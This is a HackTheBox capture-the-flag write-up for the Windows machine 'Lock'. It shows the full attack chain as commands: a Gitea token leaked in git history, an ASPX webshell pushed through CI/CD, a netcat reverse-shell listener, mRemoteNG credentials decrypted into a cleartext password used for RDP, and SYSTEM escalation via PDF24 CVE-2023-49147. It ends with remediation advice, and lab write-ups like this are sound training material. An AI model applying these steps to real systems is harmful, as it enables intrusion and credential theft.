# HackTheBox - Lock Writeup

**Machine:** Lock  
**IP Address:** 10.129.234.64  
**Difficulty:** Easy
**OS:** Windows

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Host: `lock.htb`

### Web Enumeration

Checked headers:

```bash
curl -I http://lock.htb/
```

Server identified as ASP.NET. No obvious content on the main site.

### Gitea (Port 3000)

Gitea was reachable at:

```
http://lock.htb:3000
```

Public repo `dev-scripts` contained a Python script and commit history.

---

## Initial Access

### Gitea Access Token in Git History

Reviewed commit history and found a token:

```bash
git log
git show 8b78e6c3024416bce55926faa3f65421a25d6370
```

Enumerated repos with the token:

```bash
GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f python3 repos.py http://10.129.139.121:3000
```

Cloned the website repository:

```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.139.121:3000/ellen.freeman/website.git
```

### CI/CD Webshell Deployment

Added an ASPX webshell (`webshell.aspx`) from:

```
https://github.com/grov/webshell/blob/master/webshell-LT.aspx
```

Committed and pushed:

```bash
git add webshell.aspx
git commit -m "im a comment"
git push
```

Accessed:

```
http://lock.htb/webshell.aspx
```

Executed PowerShell reverse shell (revshells.com) and got a shell as `elllen.freeman`.

Listener:

```bash
rlwrap nc -lvnp 4444
```

---

## Privilege Escalation - User

### mRemoteNG Credential Recovery

Located `config.xml`:

```cmd
type C:\Users\ellen.freeman\Documents\config.xml
```

Config contained an AES-encrypted password for `Gale.Dekarios`.

Decrypted with mRemoteNG tool:

```bash
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
python3 mremoteng_decrypt.py -rf config.xml
```

### RDP Access

Generated Kerberos config:

```bash
nxc smb 10.129.139.121 -u 'Gale.Dekarios' -p 'ty8wnW9qCKDosXo6' --generate-krb5-file /etc/krb5.conf
```

Connected via RDP:

```bash
xfreerdp3 /u:'Gale.Dekarios' /p:'ty8wnW9qCKDosXo6' /v:10.129.139.121 /size:1280x720 /tls:seclevel:0 /cert:ignore
```

User flag was retrieved via RDP.

---

## Privilege Escalation - Root

### PDF24 Creator CVE-2023-49147

PDF24 Creator version `11.15.1` was installed (v11.15.2 fixes the issue).

Used SetOpLock to lock the log file:

```powershell
.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

Started PDF24 repair; the SYSTEM `cmd.exe` window stayed open due to the oplock. Using the GUI flow, opened a `cmd.exe` as SYSTEM and gained a privileged shell.

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. Exposed Git history can leak API tokens.
2. CI/CD pipelines can be abused to deploy webshells.
3. mRemoteNG config files expose decryptable credentials.
4. RDP access provides pivot to local privilege escalation.
5. PDF24 Creator CVE-2023-49147 allows SYSTEM escalation via oplock on logs.

---

## Tools Used

- curl
- git
- netcat
- mremoteng-decrypt
- nxc
- xfreerdp3
- SetOpLock (symboliclink-testing-tools)

---

## Flags

**User Flag:** Retrieved via RDP (value not recorded in PDF)  
**Root Flag:** Retrieved from `C:\Users\Administrator\Desktop\root.txt`

---

## Remediation Recommendations

### Critical Severity

1. **Remove Secrets from Git History**

   - **Issue:** Gitea token stored in commit history.
   - **Impact:** Unauthorized repo access and code deployment.
   - **Remediation:**
     - Rotate leaked tokens immediately.
     - Use secret scanning and block secrets in commits.

2. **Harden CI/CD Deployments**

   - **Issue:** Automatic redeploy on push enabled webshell injection.
   - **Impact:** Remote code execution on the web server.
   - **Remediation:**
     - Require code review and signed commits for deployment.
     - Isolate build pipelines and implement integrity checks.

### High Severity

3. **Protect Remote Connection Managers**

   - **Issue:** mRemoteNG stored decryptable credentials.
   - **Impact:** Credential theft and RDP access.
   - **Remediation:**
     - Use credential vaults and restrict access to config files.
     - Enforce stronger encryption and rotate stored passwords.

4. **Patch PDF24 Creator**

   - **Issue:** CVE-2023-49147 allows SYSTEM escalation.
   - **Impact:** Full system compromise.
   - **Remediation:**
     - Upgrade to PDF24 Creator 11.15.2+.
     - Monitor installer repair operations and privilege abuse.

### Medium Severity

5. **Restrict RDP Exposure**

   - **Issue:** RDP reachable with recovered credentials.
   - **Impact:** User-level access and lateral movement.
   - **Remediation:**
     - Limit RDP access to admin networks and enforce MFA.
